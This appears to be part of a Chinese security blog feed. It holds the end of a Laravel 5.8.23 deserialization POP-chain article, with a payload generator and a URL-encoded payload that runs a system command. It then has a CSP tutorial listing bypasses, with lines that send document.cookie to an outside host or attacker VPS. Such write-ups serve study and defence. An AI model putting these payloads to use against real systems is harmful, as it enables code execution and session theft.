$code)</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;config = $config;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;code = $code;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Mockery</span>\<span class="title">Loader</span> &#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">EvalLoader</span></span><br><span class="line">    &#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title">namespace</span> <span class="title">Illuminate</span>\<span class="title">Bus</span> &#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">Dispatcher</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title">protected</span> $<span class="title">queueResolver</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($queueResolver)</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;queueResolver = $queueResolver;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Illuminate</span>\<span class="title">Foundation</span>\<span class="title">Console</span> &#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">QueuedCommand</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title">public</span> $<span class="title">connection</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($connection)</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;connection = $connection;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Illuminate</span>\<span class="title">Broadcasting</span> &#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">PendingBroadcast</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title">protected</span> $<span class="title">events</span>;</span><br><span class="line">        <span class="keyword">protected</span> $event;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($events, $event)</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;events = $events;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;event = $event;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> &#123;</span><br><span class="line">    $<span class="title">MethodObj</span> = <span class="title">new</span> <span class="title">PhpParser</span>\<span class="title">Node</span>\<span class="title">Scalar</span>\<span class="title">MagicConst</span>\<span class="title">Method</span>();</span><br><span class="line">    $MockDefinitionObj = <span class="keyword">new</span> Mockery\Generator\MockDefinition($MethodObj, <span class="string">"&lt;?php system('ls');?&gt;"</span>);</span><br><span class="line">    $EvalLoaderObj = <span class="keyword">new</span> Mockery\Loader\EvalLoader();</span><br><span class="line">    $DispatcherObj = <span class="keyword">new</span> Illuminate\Bus\Dispatcher(<span class="keyword">array</span>($EvalLoaderObj, <span class="string">'load'</span>));</span><br><span class="line">    $QueuedCommandObj = <span class="keyword">new</span> Illuminate\Foundation\Console\QueuedCommand($MockDefinitionObj);</span><br><span class="line">    $PendingBroadcastObj = <span class="keyword">new</span> Illuminate\Broadcasting\PendingBroadcast($DispatcherObj, $QueuedCommandObj);</span><br><span class="line">    <span class="keyword">echo</span> urlencode(serialize($PendingBroadcastObj));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>payload：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">O%<span class="number">3</span>A40%<span class="number">3</span>A%<span class="number">22</span>Illuminate%<span class="number">5</span>CBroadcasting%<span class="number">5</span>CPendingBroadcast%<span class="number">22</span>%<span class="number">3</span>A2%<span class="number">3</span>A%<span class="number">7</span>Bs%<span class="number">3</span>A9%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">00</span>%<span class="number">2</span>A%<span class="number">00</span>events%<span class="number">22</span>%<span class="number">3</span>BO%<span class="number">3</span>A25%<span class="number">3</span>A%<span class="number">22</span>Illuminate%<span class="number">5</span>CBus%<span class="number">5</span>CDispatcher%<span class="number">22</span>%<span class="number">3</span>A1%<span class="number">3</span>A%<span class="number">7</span>Bs%<span class="number">3</span>A16%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">00</span>%<span class="number">2</span>A%<span class="number">00</span>queueResolver%<span class="number">22</span>%<span class="number">3</span>Ba%<span class="number">3</span>A2%<span class="number">3</span>A%<span class="number">7</span>Bi%<span class="number">3</span>A0%<span class="number">3</span>BO%<span class="number">3</span>A25%<span class="number">3</span>A%<span class="number">22</span>Mockery%<span class="number">5</span>CLoader%<span class="number">5</span>CEvalLoader%<span class="number">22</span>%<span class="number">3</span>A0%<span class="number">3</span>A%<span class="number">7</span>B%<span class="number">7</span>Di%<span class="number">3</span>A1%<span class="number">3</span>Bs%<span class="number">3</span>A4%<span class="number">3</span>A%<span class="number">22</span>load%<span class="number">22</span>%<span class="number">3</span>B%<span class="number">7</span>D%<span class="number">7</span>Ds%<span class="number">3</span>A8%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">00</span>%<span class="number">2</span>A%<span class="number">00</span>event%<span class="number">22</span>%<span class="number">3</span>BO%<span class="number">3</span>A43%<span class="number">3</span>A%<span class="number">22</span>Illuminate%<span class="number">5</span>CFoundation%<span class="number">5</span>CConsole%<span class="number">5</span>CQueuedCommand%<span class="number">22</span>%<span class="number">3</span>A1%<span class="number">3</span>A%<span class="number">7</span>Bs%<span class="number">3</span>A10%<span class="number">3</span>A%<span class="number">22</span>connection%<span class="number">22</span>%<span class="number">3</span>BO%<span class="number">3</span>A32%<span class="number">3</span>A%<span class="number">22</span>Mockery%<span class="number">5</span>CGenerator%<span class="number">5</span>CMockDefinition%<span class="number">22</span>%<span class="number">3</span>A2%<span class="number">3</span>A%<span class="number">7</span>Bs%<span class="number">3</span>A9%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">00</span>%<span class="number">2</span>A%<span class="number">00</span>config%<span class="number">22</span>%<span class="number">3</span>BO%<span class="number">3</span>A39%<span class="number">3</span>A%<span class="number">22</span>PhpParser%<span class="number">5</span>CNode%<span class="number">5</span>CScalar%<span class="number">5</span>CMagicConst%<span class="number">5</span>CMethod%<span class="number">22</span>%<span class="number">3</span>A0%<span class="number">3</span>A%<span class="number">7</span>B%<span class="number">7</span>Ds%<span class="number">3</span>A7%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">00</span>%<span class="number">2</span>A%<span class="number">00</span>code%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A21%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">3</span>C%<span class="number">3</span>Fphp+system%<span class="number">28</span>%<span class="number">27</span>ls%<span class="number">27</span>%<span class="number">29</span>%<span class="number">3</span>B%<span class="number">3</span>F%<span class="number">3</span>E%<span class="number">22</span>%<span class="number">3</span>B%<span class="number">7</span>D%<span class="number">7</span>D%<span class="number">7</span>D</span><br></pre></td></tr></table></figure><p>完整的<code>POP</code>链流程如下：<br><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200312201743.png" alt=""></p><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200312201851.png" alt=""></p><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200312201202.png" alt=""></p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><ul><li>反序列化我感觉直接从反序列化入口开始的话，比如<code>__destruct</code>等入手的话，可能会入口函数过多导致审计过于费事，因此我觉得应该从反序列化的出口，比如<code>system、exec、eval、call_usr_func、call_user_func_array、动态函数调用、file_get_contents、file_put_contents</code>等系统命令执行或者文件操作函数入手，然后倒推到入口好一些</li><li>如果把一个类对象强制使用<code>array</code>数组化的话，他会把类属性与值同样以数组的键值对的形式保存，同样会保存属性等信息，在遇到<code>$xxxx[&#39;\0*\0yyyyyy&#39;]</code>等调用<code>protected</code>属性的值时，可以考虑寻找包含<code>protected</code>属性的类成员的类，从而实现调用</li><li><code>protected</code>属性的类成员名会用<code>%00*%00</code>做前缀，<code>private</code>属性的类成员名会用<code>%00类名%00</code>做前缀</li><li><code>final</code>关键字表示这个类不可被继承后者或者这个方法不可被复写</li><li>对于<code>$this-&gt;xxxxx</code>的变量可以直接<code>__construct</code>，但如果<code>xxxxx</code>是一个函数方法的话，得需要网上寻找参数是否可控等等</li><li><code>instanceof</code>关键字用来判断是否实现了接口或者是否为类的实例等等</li></ul><p>还有最后一点，反序列化链构造的最后我整个人都快傻了，其实这时候稍微放松然后从头走一遍流程的话，会好很多。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;strong&gt;本文内容：&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Laravel5.8.23&lt;/strong&gt;反序列化POP链分析与利用&lt;/p&gt;
    
    </summary>
    
    
      <category term="代码审计" scheme="https://a2u13.com/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    
      <category term="PHP" scheme="https://a2u13.com/tags/PHP/"/>
    
      <category term="反序列化" scheme="https://a2u13.com/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
      <category term="Laravel" scheme="https://a2u13.com/tags/Laravel/"/>
    
  </entry>
  
  <entry>
    <title>CSP（内容安全策略）原理及绕过</title>
    <link href="https://a2u13.com/2020/03/09/CSP%EF%BC%88%E5%86%85%E5%AE%B9%E5%AE%89%E5%85%A8%E7%AD%96%E7%95%A5%EF%BC%89%E5%8E%9F%E7%90%86%E5%8F%8A%E7%BB%95%E8%BF%87/"/>
    <id>https://a2u13.com/2020/03/09/CSP%EF%BC%88%E5%86%85%E5%AE%B9%E5%AE%89%E5%85%A8%E7%AD%96%E7%95%A5%EF%BC%89%E5%8E%9F%E7%90%86%E5%8F%8A%E7%BB%95%E8%BF%87/</id>
    <published>2020-03-09T08:45:57.000Z</published>
    <updated>2020-06-07T06:28:28.930Z</updated>
    
    <content type="html"><![CDATA[<p><strong>本文内容：</strong></p><p>CSP（内容安全策略）概念以及Bypass总结</p><a id="more"></a><h1 id="CSP"><a href="#CSP" class="headerlink" title="CSP"></a>CSP</h1><h2 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h2><blockquote><p>内容安全策略   (CSP) 是一个额外的安全层，用于检测并削弱某些特定类型的攻击，包括跨站脚本 (XSS) 和数据注入攻击等。无论是数据盗取、网站内容污染还是散发恶意软件，这些攻击都是主要的手段。</p></blockquote><blockquote><p>CSP 被设计成完全向后兼容，不支持CSP的浏览器也能与实现了CSP的服务器正常合作，反之亦然：不支持 CSP 的浏览器只会忽略它，如常运行，默认为网页内容使用标准的同源策略。如果网站不提供 CSP 头部，浏览器也使用标准的同源策略。</p></blockquote><h2 id="举例"><a href="#举例" class="headerlink" title="举例"></a>举例</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">header(<span class="string">"Content-Security-Policy: default-src 'self';"</span>);</span><br><span class="line"><span class="keyword">echo</span> $_GET[<span class="string">'a'</span>];;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>没设置<code>CSP</code>前或使用了<strong>unsafe-inline</strong>：</p><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200310174349.png" alt=""></p><p>设置<code>CSP</code>后：</p><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200310174301.png" alt=""></p><h2 id="CSP设置"><a href="#CSP设置" class="headerlink" title="CSP设置"></a>CSP设置</h2><p>可以通过<code>header</code>来设置启用<code>CSP</code></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">header(<span class="string">"Content-Security-Policy: default-src 'self'; script-src 'self' https://lorexxar.cn;"</span>);</span><br></pre></td></tr></table></figure><p>或者在使用<code>meta</code>标签同样启用<code>CSP</code></p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">"Content-Security-Policy"</span> <span class="attr">content</span>=<span class="string">"default-src 'self'; script-src 'self' https://lorexxar.cn;"</span>&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p>但在<code>&lt;meta&gt;</code>中不可使用<code>frame-ancestors</code>、<code>report-uri</code>和<code>sandbox</code>规则</p></blockquote><p>其中通过指定<code>Content-Security-Policy</code>的<code>HTTP</code>的头部<code>Header</code>，以及一串描述规则凌派的字符串组成<code>Header</code>的值</p><p>规则指令如下：</p><table><thead><tr><th align="center">规则</th><th align="center">规则说明</th></tr></thead><tbody><tr><td align="center"><strong><code>connect-src</code></strong></td><td align="center">限制您可以连接的来源（通过XHR，WebSocket和EventSource）</td></tr><tr><td align="center"><strong><code>font-src</code></strong></td><td align="center">指定可以提供网络字体的来源</td></tr><tr><td align="center"><strong><code>frame-src</code></strong></td><td align="center">使用child-src代替</td></tr><tr><td align="center"><strong><code>img-src</code></strong></td><td align="center">定义可以加载图像的来源</td></tr><tr><td align="center"><strong><code>child-src</code></strong></td><td align="center">列出工作程序和嵌入框架内容的URL</td></tr><tr><td align="center"><strong><code>media-src</code></strong></td><td align="center">限制允许传递视频和音频的来源</td></tr><tr><td align="center"><strong><code>object-src</code></strong></td><td align="center">允许控制Flash和其他插件</td></tr><tr><td align="center"><strong><code>style-src</code></strong></td><td align="center"><code>script-src</code>样式表的对应项</td></tr><tr><td align="center"><strong><code>default-src</code></strong></td><td align="center">默认的加载策略</td></tr></tbody></table><p>默认情况下，指令都是全部开放，如果没有对规则设定指令，比如<code>front-src</code>，则该指令默认情况下会像指定<code>*</code>为有效源一样工作（即容许从任何来源加载字体）</p><p>其中<code>default-src</code>可以用来对任意一个<code>-src</code>结尾的指令进行默认设置。比如当你设置<code>default-src https://www.baidu.com</code>时，若<code>front-src</code>，没有被设置时，则同样会从<code>https://www/baidu.com</code>加载字体</p><p>其中以下几个不受<code>default-src</code>控制，需要单独设置</p><table><thead><tr><th align="center">规则</th><th align="center">规则说明</th></tr></thead><tbody><tr><td align="center"><strong>base-uri</strong></td><td align="center">限制可以显示在页面<code>&lt;base&gt;</code>元素中的URL</td></tr><tr><td align="center"><strong>form-action</strong></td><td align="center">列出要从<code>&lt;form&gt;</code>标签提交的有效结点</td></tr><tr><td align="center"><strong>frame-ancestors</strong></td><td align="center">指定可以嵌入当前页面的源。该指令适用于<code>&lt;frame&gt;</code>，<code>&lt;iframe&gt;</code>，<code>&lt;embed&gt;</code>，和<code>&lt;applet&gt;</code>标签。该指令不能在<code>&lt;meta&gt;</code>标记中使用，并且仅适用于非HTML资源。</td></tr><tr><td align="center"><strong>plugin-types</strong></td><td align="center">限制页面可以调用的插件类型</td></tr><tr><td align="center"><strong>report-uri</strong></td><td align="center">指定一个URL，当违反内容安全策略时，浏览器将在该URL发送报告。该指令不能在<code>&lt;meta&gt;</code>标记中使用</td></tr><tr><td align="center"><strong>sandbox</strong></td><td align="center">设置沙盒环境，该页面将被视为已将其加载到<code>iframe</code>具有<code>sandbox</code>属性的内，将页面强制为唯一的来源，并阻止表单提交</td></tr></tbody></table><p>对于指令的调用，默认只使用第一个指令的策略，往后的重复策略的值将被忽略，设置格式如下：</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line">script-src https://host1.com https://host2.com</span><br></pre></td></tr></table></figure><p>除了常规的<code>URL</code>正则以及通配符组成的<code>URL</code>集合以外，其他规定的规则指令如下：</p><table><thead><tr><th align="center">关键字</th><th align="center">关键字说明</th></tr></thead><tbody><tr><td align="center"><strong>self</strong></td><td align="center">匹配当前域，但不匹配子域</td></tr><tr><td align="center"><strong>none</strong></td><td align="center">任何都不匹配</td></tr><tr><td align="center"><strong>unsafe-inline</strong></td><td align="center">允许内联<code>JavaScript</code>和<code>CSS</code></td></tr><tr><td align="center"><strong>unsafe-eval</strong></td><td align="center">允许类似文本到JavaScript的代码（如<code>eval</code>）</td></tr></tbody></table><p><a href="https://developer.mozilla.org/zh-CN/docs/Web/Security/CSP/CSP_policy_directives" target="_blank" rel="noopener">https://developer.mozilla.org/zh-CN/docs/Web/Security/CSP/CSP_policy_directives</a></p><blockquote><p>其中这些关键字需要单引号包裹才能作为关键字使用，否则会被认定为服务器URL</p></blockquote><blockquote><p>如果想向某个地址报告触发的<code>CSP</code>的警告⚠️时，可以使用<code>Content-Security-Policy-Report-Only</code>的<code>Header</code>头，同时必须采用<strong>report-uri</strong>这个规则</p></blockquote><p>其中的报告规则如下：</p><ul><li><p><code>document-uri</code> 当前攻击所发生的文档的URI。</p></li><li><p><code>referrer</code>当前攻击所发生的文档的来源页面的URI。</p></li><li><p><code>blocked-uri</code> 被CSP策略所拦截的资源的URI。如果被拦截资源的URI属于与当前文档不同的来源，则所拦截的资源URI会被削减至只剩scheme,host和port三部分。</p></li><li><p><code>violated-directive</code> 攻击所针对的策略部分的名称</p></li><li><p><code>original-policy</code> 由X-Content-Security-Policy头指定的原始策略。</p></li></ul><p><a href="https://developer.mozilla.org/zh-CN/docs/Web/Security/CSP/Using_CSP_violation_reports" target="_blank" rel="noopener">https://developer.mozilla.org/zh-CN/docs/Web/Security/CSP/Using_CSP_violation_reports</a></p><h2 id="内联代码"><a href="#内联代码" class="headerlink" title="内联代码"></a>内联代码</h2><p>对于内联的脚本代码，如：</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line">javascript:alert(1);</span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span>alert(1);<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>基于白名单的<code>CSP</code>是无法识别与阻止的，因此浏览器的默认策略是完全阻止内联代码的执行</p><p>因此如果想调用调用这种代码，通常做法是重写JS函数并绑定到相应的事件</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="actionscript">  <span class="function"><span class="keyword">function</span> <span class="title">alerts</span><span class="params">()</span> </span>&#123;</span></span><br><span class="line"><span class="actionscript">    alert(<span class="string">'1'</span>);</span></span><br><span class="line">  &#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">button</span> <span class="attr">onclick</span>=<span class="string">'alerts();'</span>&gt;</span>Button<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br></pre></td></tr></table></figure><p>然后将JS代码写入本地域JS文件当中</p><p><strong>alert.js</strong></p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">alerts</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  alert(<span class="string">'1'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">document</span>.addEventListener(<span class="string">'DOMContentReady'</span>, <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="built_in">document</span>.getElementById(<span class="string">'dots'</span>)</span><br><span class="line">          .addEventListener(<span class="string">'click'</span>, doAmazingThings);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p><strong>test.html</strong></p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">'alert.js'</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">button</span> <span class="attr">id</span>=<span class="string">'dots'</span>&gt;</span>Button<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br></pre></td></tr></table></figure><p>通过这种方式来调用JS</p><p>同时这种设置方式不止针对于<code>JS</code>，对于样式<code>CSS</code>而言，同样应该放到具体的<code>.CSS</code>文件当中，而不是通过内联的方式插入代码当中</p><p>如果想要强制使用内联代码的话，可以通过设置<code>unsafe-inline</code>或者<code>nonce</code>的随机数来限定内联脚本的执行，或者采用<code>Hash</code>来限定</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">nonce</span>=<span class="string">xxxxxxxxxxxxxxx</span>&gt;</span></span><br><span class="line"><span class="actionscript">  <span class="comment">//Code</span></span></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line">Content-Security-Policy: script-src 'nonce-xxxxxxxxxxxxxxx'</span><br></pre></td></tr></table></figure><h2 id="Bypass"><a href="#Bypass" class="headerlink" title="Bypass"></a>Bypass</h2><h3 id="link标签"><a href="#link标签" class="headerlink" title="link标签"></a>link标签</h3><p><a href="https://xz.aliyun.com/t/315" target="_blank" rel="noopener">https://xz.aliyun.com/t/315</a></p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!-- firefox --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">"dns-prefetch"</span> <span class="attr">href</span>=<span class="string">"//[cookie].xxx.ceye.io"</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- chrome --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">"prefetch"</span> <span class="attr">href</span>=<span class="string">"//vps_ip?$&#123;cookie&#125;"</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200311140151.png" alt=""></p><p>不过现在已经用不了了，会被同源策略阻止，在比较老的浏览器上可能能够触发</p><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200311140230.png" alt=""></p><h3 id="location-href"><a href="#location-href" class="headerlink" title="location.href"></a>location.href</h3><p>CSP是不会阻止<code>location.href</code>跳转的</p><p>但这种方法我感觉挺不实用的，因为会跳转过去，太明显了</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">head</span>&gt;</span><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    csp header test</span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">      location.href = <span class="string">"http://120.xx.xx.xx:xxxxx/"</span>+<span class="built_in">document</span>.cookie</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200311141843.png" alt=""></p><h3 id="利用iframe"><a href="#利用iframe" class="headerlink" title="利用iframe"></a>利用iframe</h3><p>如果我们需要数据存在于<code>A.html</code></p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">"Content-Security-Policy"</span> <span class="attr">content</span>=<span class="string">"default-src 'self'"</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span> <span class="attr">id</span>=<span class="string">"flag"</span>&gt;</span>flag&#123;A2u13&#125;<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br></pre></td></tr></table></figure><p>可以看到<code>CSP</code>被设置为只接受同源</p><p>但我们如果在同源下有一个文件<code>B.html</code></p><p>此时可以插入<code>script</code>脚本，那么就可以通过<code>iframe</code>来讲<code>A.html</code>的数据带出来</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">    <span class="keyword">var</span> iframe = <span class="built_in">document</span>.createElement(<span class="string">'iframe'</span>);</span></span><br><span class="line"><span class="actionscript">    iframe.src=<span class="string">"A.html"</span>;</span></span><br><span class="line"><span class="javascript">    <span class="built_in">document</span>.body.appendChild(iframe);</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200311142623.png" alt=""></p><h3 id="利用CDN的JS低版本库"><a href="#利用CDN的JS低版本库" class="headerlink" title="利用CDN的JS低版本库"></a>利用CDN的JS低版本库</h3><p>具体原理就是由于许多服务商性能原因需要加载外部<code>CDN</code>的JS文件，而这个<code>CDN</code>位于<code>script-src</code>当中</p><p>从而可以利用低版本中爆出的模板注入等漏洞，从而能够带出<code>cookies</code>等数据</p><p><a href="https://www.blackhat.com/docs/us-17/thursday/us-17-Lekies-Dont-Trust-The-DOM-Bypassing-XSS-Mitigations-Via-Script-Gadgets.pdf" target="_blank" rel="noopener">https://www.blackhat.com/docs/us-17/thursday/us-17-Lekies-Dont-Trust-The-DOM-Bypassing-XSS-Mitigations-Via-Script-Gadgets.pdf</a></p><p><a href="https://portswigger.net/research/xss-without-html-client-side-template-injection-with-angularjs" target="_blank" rel="noopener">XSS without HTML: Client-Side Template Injection with AngularJS</a></p><p><a href="https://paper.seebug.org/855/" target="_blank" rel="noopener">A Wormable XSS on HackMD!</a></p><p>使用Google提供的<code>CSP</code>检测工具来检测安全性 - <a href="https://csp-evaluator.withgoogle.com/" target="_blank" rel="noopener">https://csp-evaluator.withgoogle.com/</a></p><p>因此对于这种绕过方式，要注意是否采用了<code>CDN</code>来加载外部<code>JS</code>,以及<code>CDN</code>是否在<code>CSP</code>白名单之上</p><h3 id="站点静态可控"><a href="#站点静态可控" class="headerlink" title="站点静态可控"></a>站点静态可控</h3><p>原理就是利用<code>CSP</code>中可控的站点</p><p>用来生成我们需要的<code>js</code>代码，从而执行我们的代码，但同样需要<code>unsafe-eval</code>的支持</p><p>举个例子：</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">"Content-Security-Policy"</span> <span class="attr">content</span>=<span class="string">"default-src 'self'; script-src 'unsafe-eval' https://xxxxxx.com"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"https://xxxxxx.com/gtm/js/alert.js"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">alert</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">  alert(<span class="string">"CSP"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="站点可控JSONP"><a href="#站点可控JSONP" class="headerlink" title="站点可控JSONP"></a>站点可控JSONP</h3><p>用户资源或者JSONP可控的URL项目</p><p><a href="https://github.com/google/csp-evaluator/blob/master/whitelist_bypasses/jsonp.js#L32-L180" target="_blank" rel="noopener">https://github.com/google/csp-evaluator/blob/master/whitelist_bypasses/jsonp.js#L32-L180</a></p><p>要求满足站点在<code>CSP</code>的白名单当中</p><p>原理还是一致</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">"Content-Security-Policy"</span> <span class="attr">content</span>=<span class="string">"default-src 'self'; script-src https://www.google.com"</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"https://www.google.com/complete/search?client=chrome&amp;q=hello&amp;callback=alert"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>其中的<code>q</code>以及<code>callback</code>可控</p><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200311150454.png" alt=""></p><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200311150547.png" alt=""></p><h3 id="base-uri绕过"><a href="#base-uri绕过" class="headerlink" title="base-uri绕过"></a>base-uri绕过</h3><p>当当前页面的<code>CSP</code>设置了<code>default-src</code>为<code>self</code>，<code>script-src</code>设置为<code>nonce-xxx</code>时，并且对<code>base-uri</code>没有设置时，可以采用这种办法</p><p>就可以使用<code>&lt;base&gt;</code>标签使当前页面上下文为自己的<code>VPS</code>，如果页面中的合法script标签采用了相对路径，那么最终加载的js就是针对base标签中指定url的相对路径</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">"Content-Security-Policy"</span> <span class="attr">content</span>=<span class="string">"default-src 'self'; script-src 'nonce-test'"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">base</span> <span class="attr">href</span>=<span class="string">"http://120.xx.xx.xx/"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">nonce</span>=<span class="string">'test'</span> <span class="attr">src</span>=<span class="string">"alert.js"</span>&gt;</span><span class="tag">&lt;/<span 